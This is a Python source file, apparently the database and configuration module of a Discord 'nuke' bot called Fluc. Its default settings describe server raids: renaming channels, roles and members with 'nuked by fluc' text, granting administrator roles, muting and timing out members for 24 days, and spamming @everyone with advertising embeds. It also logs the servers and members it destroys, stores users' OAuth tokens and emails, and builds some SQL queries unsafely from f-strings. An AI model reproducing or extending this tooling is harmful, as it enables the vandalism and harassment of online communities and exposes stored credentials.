# Supress warnings
from __future__ import annotations

__all__ = (
    'Database',
    'User',
    'Stats',
    'Settings'
)

import os
import tarfile
import orjson
import asyncio
import sqlite3
import datetime

from bots.shared.hints import *

from threading import Lock
from io import BytesIO
from copy import deepcopy
from discord import Color, Embed
from colorama import Fore
from logging import getLogger

from discord import (
    Permissions as _Permissions,
    Color as _Color
)

from typing import (
    Optional,
    Dict,
    Tuple,
    List,
    Literal,
    IO,
    Union,
    Any,
    overload
)


log = getLogger()




def _color_gen(amount: int) -> List[str]:
    colors = []
    for _ in range(amount):
        r, g, b = _Color.random().to_rgb()
        colors.append(f'#{r:02x}{g:02x}{b:02x}')
    return colors



class Database:
    closed: bool
    connection: Optional[sqlite3.Connection]
    users: List[int]
    premiums: List[int]
    admins: List[int]
    owners: List[int]
    blacklisted_servers: List[int]
    blacklisted_users: List[int]
    config: Optional[Config]
    config_path: str
    loop: Optional[asyncio.AbstractEventLoop]
    initialized: bool
    lock: Lock
    json_lock: Lock
    block: Optional[IO]

    server_icon = 'https://cdn.discordapp.com/icons/1358429542607229018/1135263cd55cfc4660a8cb52bbd9ad0b.webp?size=1024&width=343&height=343'
    unicode_emojis = [
        f'{ord(emoji[0]):X}'.lower() for emoji in
        [
            '💥',
            '😈',
            '🤡',
            '💩',
            '🖕',
            '💀',
            '🤣',
            '☠️',
            '👹',
            '😡',
            '😢',
            '👏',
            '😹',
            '🖤',
            '📢',
            '🤓',
            '☝',
            '😨',
            '😏',
            '🤔',
            '🪦',
            '🎉',
            '🔥',
            '⚡',
            '💣',
            '👾',
            '🧨',
            '🛠️',
            '🎯',
            '🌀',
            '🌪️'
        ]
    ]
    fonts = [
        '「🤡」𝔫𝔲𝔨𝔢𝔡 𝔟𝔶 𝔣𝔩𝔲𝔠',
        '「💩」𝕥𝕣𝕒𝕤𝕙𝕖𝕕 𝕓𝕪 𝕗𝕝𝕦𝕔',
        '「💀」₩ⱤɆ₵₭ɆĐ ฿Ɏ ₣ⱠɄ₵',
        '「🖕」ɾąìժҽժ ҍվ ƒӀմç',
        '「👹」𐋅𐌀𐌂𐌊𐌄𐌃 𐌁𐌙 𐌅𐌋𐌵𐌂',
        '「👏」ᖴᒪᑌᑕ Oᗯᑎᔕ',
        '「😢」s҉l҉a҉v҉e҉r҉y҉ ҉b҉y҉ ҉f҉l҉u҉c҉',
        '「🤓」ρɯɳҽԃ Ⴆყ ϝʅυƈ',
        '「😹」ᶠⁱⁿⁱˢʰᵉᵈ ᵇʸ ᶠˡᵘᶜ',
        '「🤣」f̴l̴u̴c̴s̴ ̴p̴r̴o̴p̴e̴r̴t̴y̴',
        '「💥」o̷b̷l̷i̷t̷e̷r̷a̷t̷e̷d̷ ̷b̷y̷ ̷f̷l̷u̷c̷',
        '「😈」f̲l̲u̲c̲ ̲o̲n̲ ̲t̲o̲p̲',
        '「📢」j̶o̶i̶n̶ ̶f̶l̶u̶c̶',
        '「🖤」𝘤𝘳𝘢𝘴𝘩𝘦𝘥 𝘣𝘺 𝘧𝘭𝘶𝘤',
        '「🪦」𝖍𝖆𝖈𝖐𝖊𝖉 𝖇𝖞 𝖋𝖑𝖚𝖈',
        '「🎉」≋f≋l≋u≋c≋ ≋o≋w≋n≋e≋d≋',
        '「🔥」ßµrñêÐ ß¥ £lµ¢',
        '「⚡」ₛₕₒcₖₑd by fₗᵤc',
        '「💣」𝒷𝓁𝑜𝓌𝓃 𝓊𝓅 𝒷𝓎 𝒻𝓁𝓊𝒸',
        '「👾」Ꮆㄥ丨ㄒ匚卄乇ᗪ　乃ㄚ　千ㄥㄩ匚',
        '「🧨」ɖɛȶօռǟȶɛɖ ɮʏ ʄʟʊƈ',
        '「☠️」DΣVΛƧƬΛƬΣD BY FᄂЦᄃ',
        '「🛠️」ร๓ครђє๔ ๒ץ Ŧɭยς',
        '「🎯」ᕼIT ᗷY ᖴᒪᑌᑕ',
        '「🌀」Sᘺᓰᖇᒪᘿᕲ ᗷᖻ ᖴᒪᑘᑢ',
        '「🌪️」Ⓣᵒℝ𝐍𝐀∂𝕆𝕖ᗪ 𝐛𝔂 𝓕lย¢'
    ]

    default_settings: SettingsData = {
        'reasons': [
            '🤡'
        ],
        'prefixes': [
            '.'
        ],
        'webhook_amount': 26,
        'channel': {
            'name': fonts,
            'topic': [],
            'nsfw': [
                False
            ],
            'slowmode_delay': []
        },
        'webhook': {
            'name': [
                'Fluc'
            ]
        },
        'role': {
            'name': fonts,
            'permissions': [
                _Permissions.all().value,
                _Permissions.administrator.flag,
                0
            ],
            'color': _color_gen(50),
            'hoist': [
                True,
                False
            ],
            'mentionable': [
                True
            ]
        },
        'emoji': {
            'name': [
                'Fluc'
            ],
            'image': [
                server_icon
            ]
        },
        'sticker': {
            'name': [
                'Fluc'
            ],
            'image': [
                server_icon
            ],
            'description': fonts,
            'emoji': [
                '💥',
                '😈',
                '🤡',
                '💩',
                '🖕',
                '💀',
                '🤣',
                '☠️',
                '👹',
                '😡',
                '😢',
                '👏',
                '😹',
                '🖤',
                '📢',
                '🤓',
                '☝',
                '😨',
                '😏',
                '🤔',
                '🪦',
                '🎉',
                '🔥',
                '⚡',
                '💣',
                '👾',
                '🧨',
                '🛠️',
                '🎯',
                '🌀',
                '🌪️'
            ]
        },
        'member': {
            'nick': fonts,
            'mute': [
                True,
                False
            ],
            'deafen': [
                True,
                False
            ],
            'supress': [
                True,
                False
            ],
            'timed_out_until': [
                # 24 days
                60 * 60 * 24 * 24
            ]
        },
        'guild': {
            'name': [
                font.split('」')[1] for font in fonts
            ],
            'icon': [
                server_icon
            ]
        },
        'message': {
            'content': [
                '@everyone @here **BEST NUKE BOT? CHOOSE FLUC** discord.gg/yNNUVVzHm2'
            ],
            'tts': [
                True
            ],
            'username': fonts,
            'avatar_url': [      
                f'https://images.emojiterra.com/twitter/v14.0/128px/{code}.png'
                for code in unicode_emojis
            ],
            'embed': [{
                'title': '_*RAID BY FLUC_',
                'description': f'```ansi\n{Fore.RED}YouTube: https://www.youtube.com/@lasnuh\n{Fore.BLUE}Discord: discord.gg/yNNUVVzHm2\n```',
                'color': Color.red().value,
                'image': 'https://media.discordapp.net/attachments/1288587327811358735/1324002009019580516/image.png?ex=67fa6675&is=67f914f5&hm=8cbb87e63acb639ea31cc11c45249cc7b3d4d74ffb2fb962db25481ac8af2325&=&format=webp&quality=lossless&width=698&height=258',
            }]
        }
    }

    def __init__(
        self,
        *,
        loop: Optional[asyncio.AbstractEventLoop] = None
    ) -> None:
        self.closed = True
        self.connection = None
        self.users = []
        self.premiums = []
        self.admins = []
        self.owners = []
        self.blacklisted_users = []
        self.blacklisted_servers = []
        self.config = None
        self.initialized = False
        self.lock = Lock()
        self.block_lock = Lock()
        self.blocks = None
        
        try:
            self.loop = loop or asyncio.get_event_loop()
        except RuntimeError:
            self.loop = None


    def base_connect(self) -> None:
        path = os.path.join(os.getcwd(), 'data/database.db')
        self.connection = sqlite3.connect(path, timeout=10, check_same_thread=False)
        self.connection.row_factory = sqlite3.Row
        log.info('Successfully connected to database!')
        self.closed = False
        self.config_path = os.path.join(os.getcwd(), 'data/config.json')
        self.connection.commit()
        self.config = Config(Database.get_config(as_dict=True))


    def connect(self) -> None:
        if self.closed is True:
            self.base_connect()

        self.check()
        self.sync()
        self.initialized = True
        log.info('Database synced!')


    def close(self) -> None:
        if self.blocks:
            self.blocks.close()

        if self.connection:
            self.connection.close()

        else:
            return
        self.closed = True
        log.info('Database closed.')


    def check(self) -> None:
        self.execute('CREATE TABLE IF NOT EXISTS users(id INTEGER PRIMARY KEY, server_amount INTEGER, user_amount INTEGER, partners BLOB, settings BLOB)')
        self.execute('CREATE TABLE IF NOT EXISTS data(id INTEGER PRIMARY KEY, users BLOB, servers BLOB)')
        self.execute('CREATE TABLE IF NOT EXISTS backups(id INTEGER PRIMARY KEY, key TEXT, data BLOB)')
        self.execute('CREATE TABLE IF NOT EXISTS blacklists(users INTEGER, servers INTEGER)')
        self.execute('CREATE TABLE IF NOT EXISTS premiums(id INTEGER PRIMARY KEY)')
        self.execute('CREATE TABLE IF NOT EXISTS admins(id INTEGER PRIMARY KEY)')
        self.execute('CREATE TABLE IF NOT EXISTS owners(id INTEGER PRIMARY KEY)')
        self.execute('CREATE TABLE IF NOT EXISTS auths(id INTEGER PRIMARY KEY, username TEXT, avatar TEXT, access_token TEXT, token_type TEXT, expires INTEGER, refresh_token TEXT, scope TEXT, email TEXT)')
        
        try:
            self.execute('SELECT * FROM stats')
        
        except sqlite3.OperationalError:
            self.execute('CREATE TABLE IF NOT EXISTS stats(server_amount INTEGER, user_amount INTEGER)')
            self.execute('INSERT INTO stats(server_amount, user_amount) VALUES(?, ?)', (0, 0))


    def sync(self) -> None:
        self.blocks = open('data/blocked.json', 'r+b')
        
        def to_list(row: sqlite3.Row) -> list:
            try:
                return [value for value in dict(row).values()]

            except ValueError:
                # Not a dict
                return [value for value in row]

        # Do not load everything as there is a possibility of memory overload.
        cells = self.execute('SELECT id FROM users', fetch_all=True)
        for user_id in cells:
            user_id = user_id[0]
            if not user_id in self.users:
                self.users.append(user_id)

        cells = self.execute('SELECT id FROM premiums', fetch_all=True)
        for user_id in to_list(cells):
            user_id = user_id[0]
            if not user_id in self.premiums:
                self.premiums.append(user_id)

        cells = self.execute('SELECT id FROM admins', fetch_all=True)
        for user_id in to_list(cells):
            user_id = user_id[0]
            if not user_id in self.admins:
                self.admins.append(user_id)

        cells = self.execute('SELECT id FROM owners', fetch_all=True)
        for user_id in to_list(cells):
            user_id = user_id[0]
            if not user_id in self.owners:
                self.owners.append(user_id)

        columns, _ = self.execute('SELECT * FROM blacklists', as_dict=True)
        for user_id in to_list(columns['users']):
            user_id = user_id[0]
            if not user_id in self.blacklisted_users:
                self.blacklisted_users.append(user_id)

        for server_id in to_list(columns['servers']):
            server_id = server_id[0]
            if not server_id in self.blacklisted_servers:
                self.blacklisted_servers.append(server_id)

    
    def add_user(self, user: User) -> bool:
        if user.id in self.users:
            return False
        
        self.execute(
            'INSERT INTO users(id, server_amount, user_amount, partners, settings)'
            'VALUES(?, ?, ?, ?, ?)',
            (user.id, user.server_amount, user.user_amount, orjson.dumps([]), orjson.dumps(None))
        )
        self.users.append(user.id)
        # This also updates the cache
        self.update_user(user)
        return True
    

    def update_user(self, user: User) -> bool:
        old_user = self.get_user(user.id)
        if old_user is None:
            return False
        
        partners = orjson.dumps(user.partners)
        if user.settings.raw_data == self.default_settings:
            settings = orjson.dumps(None)
        
        else:
            settings = orjson.dumps(user.settings.raw_data)
        
        self.execute(
            'UPDATE users SET server_amount=?, user_amount=?, partners=?, settings=? WHERE ID=?',
            (user.server_amount, user.user_amount, partners, settings, user.id)
        )

        if not old_user.auth and user.auth:
            self.execute(
                'INSERT INTO auths(id, username, avatar, access_token, token_type, expires, refresh_token, scope, email)'
                'VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)',
                (user.auth.id, user.auth.username, user.auth.avatar, user.auth.access_token, user.auth.token_type, user.auth.expires, user.auth.refresh_token, user.auth.scope, user.auth.email)
            )

        elif old_user.auth and user.auth:
            self.execute(
                'UPDATE auths SET username=?, avatar=?, access_token=?, token_type=?, expires=?, refresh_token=?, scope=?, email=? WHERE id=?',
                (user.auth.username, user.auth.avatar, user.auth.access_token, user.auth.token_type, user.auth.expires, user.auth.refresh_token, user.auth.scope, user.auth.email, user.id)
            )

        if user.is_premium and not old_user.is_premium:
            self.premiums.append(user.id)
            self.execute('INSERT INTO premiums(id) VALUES(?)', (user.id,))
        
        elif not user.is_premium and old_user.is_premium:
            self.premiums.remove(user.id)
            self.execute('DELETE FROM premiums WHERE id=?', (user.id,))

        if user.is_admin and not old_user.is_admin:
            self.admins.append(user.id)
            self.execute('INSERT INTO admins(id) VALUES(?)', (user.id,))
        
        elif not user.is_admin and old_user.is_admin:
            self.admins.remove(user.id)
            self.execute('DELETE FROM admins WHERE id=?', (user.id,))

        if user.is_owner and not old_user.is_owner:
            self.owners.append(user.id)
            self.execute('INSERT INTO owners(id) VALUES(?)', (user.id,))
        
        elif not user.is_owner and old_user.is_owner:
            self.owners.remove(user.id)
            self.execute('DELETE FROM owners WHERE id=?', (user.id,))

        if user.is_blacklisted and not old_user.is_blacklisted:
            self.blacklisted_users.append(user.id)
            self.execute('INSERT INTO user_blacklist(id) VALUES(?)', (user.id,))
        
        elif not user.is_blacklisted and old_user.is_blacklisted:
            self.blacklisted_users.remove(user.id)
            self.execute('DELETE FROM user_blacklist WHERE id=?', (user.id,))
        return True


    def delete_user(self, user: User, *, bypass: bool = False) -> bool:
        if not bypass and user.is_admin:
            return False

        if user.is_owner:
            # User is an owner. Can not delete
            return False

        self.execute('DELETE FROM users WHERE id=?', (user.id,))
        self.delete_partners(user, *user.partners, ignore_errors=True)
        
        if user.id in self.users:
            self.users.remove(user.id)

        if user.id in self.premiums:
            self.premiums.remove(user.id)

        if user.id in self.admins:
            self.admins.remove(user.id)

        # Should not happen
        if user.id in self.owners:
            self.owners.remove(user.id)
        return True
    

    def add_partners(self, user: User, *target_ids: int) -> bool:
        partners = self.get_partners(user)
        for target_id in target_ids:
            if target_id in partners:
                return False
        
        partners += target_ids
        partners = orjson.dumps(partners)
        self.execute(
            'UPDATE users SET partners=? WHERE id=?',
            (list(partners), user.id)
        )
        return True
    

    def delete_partners(self, user: User, *target_ids: int, ignore_errors: bool = False) -> bool:
        partners = self.get_partners(user)
        if ignore_errors is False:
            for target_id in target_ids:
                if not target_id in partners:
                    return False
            
                else:
                    try:
                        partners.remove(target_id)
                    
                    except ValueError:
                        pass
        
        else:
            partners = [user_id for user_id in partners if not user_id in target_ids]

        partners = orjson.dumps(partners)
        self.execute(
            'UPDATE users SET partners=? WHERE id=?',
            (tuple(partners), user.id)
        )
        return True
    

    def get_partners(self, user: User) -> List[int]:
        partners = self.execute(
            'SELECT partners FROM users WHERE id=?',
            (user.id,)
        )

        if partners is None:
            return []
        
        result = orjson.loads(partners)
        return [int(user_id) for user_id in result]
    

    def _parse_user(self, user_data: PartialUserDict) -> User:
        settings = orjson.loads(user_data['settings'])
        user_id = user_data['id']
        auth_data = self.get_auth(user_id, as_dict=True)
        user_data['is_premium'] = user_id in self.premiums 
        user_data['is_admin'] = user_id in self.admins
        user_data['is_owner'] = user_id in self.owners
        user_data['auth_data'] = auth_data

        if (
            not settings or
            not isinstance(settings, dict) or (
                # Settings corrupted
                not settings.items() <= self.default_settings.items() and
                not int(user_data['id']) in self.owners + self.admins and
                user_data['is_premium'] is False
            )
        ):
            user_data['settings'] = orjson.dumps(self.default_settings)

        user_data['is_blacklisted'] = int(user_data['id']) in self.blacklisted_users
        user = User(user_data)
        return user


    def get_user(self, user_id: int) -> Optional[User]:
        row = self.execute(
            'SELECT * FROM users WHERE id=?',
            (user_id,)    
        )

        if row is None:
            return None
        
        row: PartialUserDict = dict(row) # type: ignore
        user = self._parse_user(row)
        return user
    

    def get_top(self, order_by: str, *, limit: int = 10, start_from: int = 1) -> Optional[Tuple[User, ...]]:
        cells = self.execute(f'SELECT id FROM users ORDER BY {order_by} DESC limit {limit} OFFSET {start_from - 1}', fetch_all=True)
        user_data = [dict(user_id) for user_id in cells]
        users: List[User] = []

        if user_data is None:
            return None
        
        for data in user_data:
            user = self.get_user(data['id'])
            if user:
                users.append(user)
        return tuple(users)


    def get_users(self) -> Tuple[User, ...]:
        users: List[User] = []
        for user_id in self.users:
            user = self.get_user(user_id)
            if user:
                users.append(user)
        return tuple(users)
    

    def add_auth(self, user: AuthUser) -> bool:
        if self.get_user(user.id):
            return False
        
        self.execute(
            'INSERT INTO users(id, avatar, username, access_token, token_type, expires, refresh_token, scope, email) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)',
            (user.id, user.avatar, user.name, user.access_token, user.token_type, user.expires, user.refresh_token, user.scope, user.email)
        )
        return True
    

    def update_auth(self, user: AuthUser) -> bool:
        if not self.get_auth(user.id):
            return False
        
        self.execute(
            'UPDATE auths SET username=?, access_token=?, refresh_token=?, expires=?, scope=?, email=? WHERE id=?',
            (user.name, user.access_token, user.refresh_token, user.expires, user.scope, user.email, user.id)
        )
        return True

    
    def remove_auth(self, user: AuthUser) -> bool:
        if not self.get_auth(user.id):
            return False
        self.execute('DELETE FROM auths WHERE id=?', (user.id,))
        return True
    

    @overload
    def get_auth(
        self,
        user_id: int
    ) -> Optional[AuthUser]: ...
    

    @overload
    def get_auth(
        self,
        user_id: int,
        *,
        as_dict: Literal[True]
    ) -> Optional[TAuthData]: ...
    

    @overload
    def get_auth(
        self,
        user_id: int,
        *,
        as_dict: Literal[False]
    ) -> Optional[AuthUser]: ...


    def get_auth(
        self,
        user_id: int,
        *,
        as_dict: bool = False
    ) -> Optional[Union[AuthUser, TAuthData]]:
        result = self.execute('SELECT * FROM auths WHERE id=?', (user_id,))
        if result is None:
            return None

        result: TAuthData = dict(result) # type: ignore
        if as_dict:
            return result
            
        user = AuthUser(result)
        return user
    

    def add_block(self, user_id: int, reason: str, expires: float, *, system: bool = False) -> bool:
        blocks = self._read_blocks()
        for block in blocks:
            if block['user_id'] == user_id:
                block['expired'] = True
        
        data: TBlocked = {
            'user_id': user_id,
            'expires': expires,
            'reason': reason,
            'system': system,
            'expired': False
        }

        blocks.append(data)
        result = self._write_blocks(blocks)
        return result


    def remove_block(self, block: TBlocked) -> bool:
        if not self._get_block(block['user_id']):
            return False
        
        blocks = self._read_blocks()
        blocks.remove(block)
        block['expired'] = True
        blocks.append(block)
        self._write_blocks(blocks)
        return True

        
    def get_block(self, user_id: int) -> Optional[TBlocked]:
        block: Optional[TBlocked] = None
        blocks = self._get_blocks(user_id)
        
        for _block in blocks:
            now = datetime.datetime.now(datetime.UTC)
            if _block['expires'] < now.timestamp():
                if not _block['expired']:
                    self.remove_block(_block)

            else:
                block = _block
                break
        return block

        
    def _get_block(self, user_id: int) -> Optional[TBlocked]:
        blocks = self._read_blocks()
        for block in blocks:
            if block['user_id'] == user_id:
                if not block['expired']:
                    return block

        
    def _get_blocks(self, user_id: int) -> List[TBlocked]:
        all_blocks = self._read_blocks()
        blocks = []

        for block in all_blocks:
            if block['user_id'] == user_id:
                blocks.append(block)
        return blocks
    

    def _read_blocks(self) -> List[TBlocked]:
        if self.blocks:
            with self.block_lock:
                self.blocks.seek(0)
                data = self.blocks.read()
                if not data:
                    return []
                return orjson.loads(data)
        return []
    

    def _write_blocks(self, blocks: List[TBlocked]) -> bool:
        if not self.blocks:
            return False
        
        with self.block_lock:
            self.blocks.seek(0)
            self.blocks.truncate()
            self.blocks.write(orjson.dumps(blocks))
            self.blocks.flush()
        return True
        

    @overload
    def get_data(
        self,
        item: Literal['users', 'servers'],
        *,
        as_list: Literal[True]
    ) -> List[int]: ...


    @overload
    def get_data(
        self,
        item: Literal['users', 'servers'],
        *,
        as_list: Literal[False]
    ) -> Dict[int, List[int]]: ...


    @overload
    def get_data(
        self,
        item: Literal['users', 'servers'],
    ) -> Dict[int, List[int]]: ...


    def get_data(
        self,
        item: Literal['users', 'servers'],
        *,
        as_list: bool = False
    ) -> Union[List[int], Dict[int, List[int]]]:
        column: sqlite3.Row = self.execute(f'SELECT id, {item} FROM data', fetch_all=True)
        items: Union[List[int], Dict[int, List[int]]] = {}
        results: Union[List[Any], Dict[Any, Any]]

        if as_list:
            results = [cell[1] for cell in column]
        
        else:
            results = {cell[0]: cell[1] for cell in column}
        
        if results == []:
            if as_list:
                return []
            return {}
        
        if as_list:
            items = []
            for result in results:
                parsed: Dict[int, int] = orjson.loads(result)
                for item_id in parsed:
                    items.append(item_id)

        else:
            if isinstance(results, dict):
                for user_id, result in results.items():
                    items[user_id] = orjson.loads(result)
        return items
    

    def update_data(self, item: Literal['users', 'servers'], user_id: int, patch: Dict[Any, Optional[bool]]) -> bool:
        def update_list(ls: List, patch: Dict[Any, Optional[bool]]):
            for item in patch:
                if patch[item] is False:
                    if item in ls:
                        try:
                            ls.remove(item)
                        
                        except ValueError:
                            # Ignore
                            continue
                
                else:
                    if item not in ls:
                        ls.append(item)

        result: Dict[int, Any] = self.get_data(item)
        data = result.get(user_id, [])
        update_list(data, patch)
        patched = orjson.dumps(data)
        
        if not user_id in result.keys():
            if item == 'servers':
                params = (user_id, orjson.dumps([]), patched)

            else:
                params = (user_id, patched, orjson.dumps([]))
            self.execute(f'INSERT INTO data(id, users, servers) VALUES(?, ?, ?)', params)

        else:
            self.execute(
                f'UPDATE data SET {item}=? WHERE id=?',
                (patched, user_id)
            )
        return True
        

    def set_nuke(self, user: User, guild_id: int, members: List[int]) -> bool:
        result = self.get_data('servers', as_list=True)
        server_data = {}
        user_data = {}

        if guild_id in result:
            # The server has already been nuked
            return False
        # Save resources
        del result
        
        server_data[guild_id] = True

        previous = self.get_data('users', as_list=True)
        # Do not log already nuked members
        members = [member for member in members if not member in previous]
        # Set each member in user_data to True
        user_data.update(dict.fromkeys(members, True))
        del previous

        # Update data
        self.update_data('servers', user.id, server_data)
        self.update_data('users', user.id, user_data)

        # Update user stats..
        user.server_amount += 1
        user.user_amount += len(members)
        self.update_user(user)

        # And global stats..
        self.update_stats(1, len(members))
        return True
    

    def create_backup(self, guild_id: int, key: str, data: BackupData) -> bool:
        if self.get_backup(guild_id=guild_id):
            return False
        
        payload: bytes = orjson.dumps(data)
        self.execute(
            'INSERT INTO backups(id, key, data)'
            'VALUES(?, ?, ?)',
            (guild_id, key, payload)
        )
        return True
    

    def delete_backup(self, guild_id: Union[int, str]) -> bool:
        if self.get_backup(guild_id=guild_id) is None:
            return False
        
        self.execute(f'DELETE FROM backups WHERE id={guild_id}')
        return True


    def get_backup(self, *, guild_id: Optional[Union[int, str]] = None, key: Optional[str] = None, get_guild_id: bool = False) -> Optional[BackupData]:
        result: Optional[sqlite3.Row] = None

        if key:
            result = self.execute(
                'SELECT * FROM backups WHERE key=?',
                (key,)
            )

        if guild_id and not result:
            result = self.execute(
                'SELECT * FROM backups WHERE id=?',
                (guild_id,)
            )
        
        if result is None:
            return None
        
        if get_guild_id is True:
            return result['id']
        
        data_key = result['key']
        if key:
            if not data_key == key:
                return

        data = result['data']
        data = orjson.loads(data)
        return data

    
    def blacklist_server(self, server_id: int) -> bool:
        if server_id in self.blacklisted_servers:
            return False
        
        self.execute(
            'INSERT INTO server_blacklists(id) VALUES(?)',
            (server_id,)
        )
        self.blacklisted_servers.append(server_id)
        return True
    

    def remove_blacklist_server(self, server_id: int) -> bool:
        if not server_id in self.blacklisted_servers:
            return False

        self.execute('DELETE FROM users WHERE id=?', (server_id,))
        self.blacklisted_servers.remove(server_id)
        return True
    

    def blacklist_user(self, user_id: int) -> bool:
        if user_id in self.blacklisted_users:
            return False
        
        self.execute(
            'INSERT INTO user_blacklists(id) VALUES(?)',
            (user_id,)
        )
        self.blacklisted_users.append(user_id)
        return True
    

    def remove_blacklist_user(self, user_id: int) -> bool:
        if not user_id in self.blacklisted_users:
            return False
        
        self.execute('DELETE FROM users_blacklist WHERE id=?', (user_id,))
        self.blacklisted_users.remove(user_id)
        return True
    

    def get_stats(self) -> Stats:
        result = self.execute('SELECT * FROM stats')

        if result is None:
            stats = Stats({'user_amount': 0, 'server_amount': 0}) 
            return stats
        
        stats = Stats(result)
        return stats
    

    def set_stats(self, stats: Stats) -> None:
        self.execute(
            'UPDATE stats SET server_amount=?, user_amount=?',
            (stats.server_amount, stats.user_amount)
        )
        self.sync()

    
    def update_stats(self, server_amount: int, user_amount: int) -> None:
        stats = self.get_stats()
        stats.server_amount += server_amount
        stats.user_amount += user_amount
        self.set_stats(stats)


    def get_config(self, *, as_dict: bool = False) -> Optional[Config]:
        try:
            with open(self.config_path, encoding='utf-8') as file:
                data = orjson.loads(file.read())
                if as_dict:
                    return data
                return Config(data)

        except FileNotFoundError:
            return None
        

    @overload
    def execute(
        self,
        command: str,
        parameters: Tuple[Any, ...] = (...,),
    ) -> Any: ...


    @overload
    def execute(
        self,
        command: str,
        parameters: Tuple[Any, ...] = (),
        *,
        fetch_all: bool = ...
    ) -> Any: ...


    @overload
    def execute(
        self,
        command: str,
        parameters: Tuple[Any, ...] = (),
        *,
        as_dict: Literal[True],
        fetch_all: bool = ...
    ) -> Tuple[Dict, List]: ...
        

    def execute(
        self,
        command: str,
        parameters: Tuple[Any, ...] = (),
        *,
        as_dict: bool = False,
        fetch_all: bool = False
    ) -> Any:
        if self.closed is True:
            log.warning('Database not connected! This may lead to unexpected behavior!')

        if self.connection:
            with self.lock and self.connection:
                cursor = self.connection.cursor()
                cursor.execute(command, tuple(parameters))

                if as_dict:
                    rows = cursor.fetchall()
                    columns = [description[0] for description in cursor.description]
                    result = {column: [row[i] for row in rows] for i, column in enumerate(columns)}
                    return result, rows

                self.connection.commit()
                if fetch_all:
                    return cursor.fetchall()
                return cursor.fetchone()
            

    def dump(self) -> BytesIO:
        buffer = BytesIO()
        path = os.path.join(os.getcwd(), 'archive.tar')

        with tarfile.open(path, 'w') as archive:
            archive.add(os.path.join(os.getcwd(), 'data', 'database.db'))

        with open(path, 'rb') as file:
            buffer.write(file.read())
        
        os.remove(path)
        buffer.seek(0)
        return buffer
    

    def __enter__(self) -> None:
        pass


    def __exit__(self, *args) -> None:
        self.close()



class Config:
    bot_token: str
    command_prefix: str
    owner_ids: Tuple[int]
    admin_ids: Tuple[int]
    emoji_guild: int

    def __init__(self, data: Dict) -> None:
        self.bot_token = data['bot_token']
        self.command_prefix = data['command_prefix']
        self.emoji_guild = int(data['emoji_guild'])



class AuthUser:
    id: int
    access_token: str
    token_type: str
    expires: int
    refresh_token: str
    scope: str

    def __init__(self, data: TAuthData):
        self.id = data['id']
        self.avatar = data['avatar']
        self.name = data['username']
        self.email = data['email']
        self.access_token = data['access_token']
        self.token_type = data['token_type']
        self.expires = data['expires']
        self.refresh_token = data['refresh_token']
        self.scope = data['scope']


    @classmethod
    def new(cls, user_id: int) -> AuthUser:
        self = cls.__new__(cls)
        self.id = user_id
        return self
    


class AuthData:
    id: int
    username: str
    avatar: Optional[str]
    access_token: str
    token_type: str
    expires: int
    refresh_token: str
    scope: str
    email: str

    def __init__(self, data: TAuthData):
        self.id = int(data['id'])
        self.username = data['username']
        self.avatar = data.get('avatar')
        self.access_token = data['access_token']
        self.token_type = data['token_type']
        self.expires = int(data['expires'])
        self.refresh_token = data['refresh_token']
        self.scope = data['scope']
        self.email = data['email']



class User:
    id: int
    is_premium: bool
    is_admin: bool
    is_owner: bool
    is_blacklisted: bool
    server_amount: int
    user_amount: int
    partners: Tuple[int, ...]
    settings: Settings
    auth: Optional[AuthData]
    
    def __init__(self, data: PartialUserDict) -> None:
        self.id = int(data['id'])
        self.is_premium = bool(data['is_premium'])
        self.is_admin = bool(data['is_admin'])
        self.is_owner = bool(data['is_owner'])
        self.is_blacklisted = bool(data['is_blacklisted'])
        self.user_amount = int(data['user_amount'])
        self.server_amount = int(data['server_amount'])
        self.partners = tuple(orjson.loads(data['partners']))
        self.settings = Settings(orjson.loads(data['settings']), self)
        auth_data = data['auth_data']
        self.auth = AuthData(auth_data) if auth_data else auth_data
        if self.is_premium:
            # Remove the default embed from user settings
            self.settings.message['embed'] = []
            self.settings.data['message']['embed'] = []
            self.settings.raw_data['message']['embed'] = []


    @property
    def elevated(self):
        return self.is_admin or self.is_owner
    

    @classmethod
    def new_user(cls, user_id: int) -> User:
        self = super().__new__(cls)
        self.id = int(user_id)
        self.is_premium = False
        self.is_blacklisted = False
        self.is_admin = False
        self.is_owner = False
        self.user_amount = 0
        self.server_amount = 0
        self.partners = ()
        self.settings = Settings(Database.default_settings, self)
        self.auth = None
        return self
    


class Settings:
    data: SettingsData
    reasons: Optional[List[str]]
    webhook_amount: int
    channel: ChannelDict
    webhook: WebhookDict
    role: RoleDict
    emoji: EmojiDict
    sticker: StickerDict
    member: MemberDict
    guild: GuildDict
    message: MessageDict

    def __init__(self, data: SettingsData, user: User) -> None:
        self.raw_data: SettingsData = data
        self.data: SettingsData = deepcopy(self.raw_data)
        self.parse_embed()
        
        self.webhook_amount = 46 if user.is_premium else 26
        self.reasons = self.data['reasons']
        self.channel = self.data['channel']
        self.webhook = self.data['webhook']
        self.role = self.data['role']
        self.emoji = self.data['emoji']
        self.sticker = self.data['sticker']
        self.member = self.data['member']
        self.guild = self.data['guild']
        self.message = self.data['message']

    
    def parse_embed(self) -> None:
        embeds: List[EmbedDict] = self.raw_data['message']['embed'] # type: ignore

        for i, data in enumerate(embeds):
            embed = Embed(
                title=data['title'],
                description=data['description'],
                color=data['color']
            )

            if 'footer' in data:
                embed.set_footer(
                    text=data['footer']['text'],
                    icon_url=data['footer'].get('icon_url')
                )

            if 'thumbnail' in data:
                embed.set_thumbnail(url=data['thumbnail'])

            if 'author' in data:
                embed.set_author(
                    name=data['author']['name'],
                    url=data['author'].get('url'),
                    icon_url=data['author'].get('icon_url')
                )

            if 'image' in data:
                embed.set_image(url=data['image'])

            if 'fields' in data:
                for field in data['fields']:
                    embed.add_field(
                        name=field['name'],
                        value=field['value'],
                        inline=field['inline']
                    )
            self.data['message']['embed'][i] = embed



class Stats:
    server_amount: int
    user_amount: int

    def __init__(self, data) -> None:
        self.server_amount = int(data['server_amount'])
        self.user_amount = int(data['user_amount'])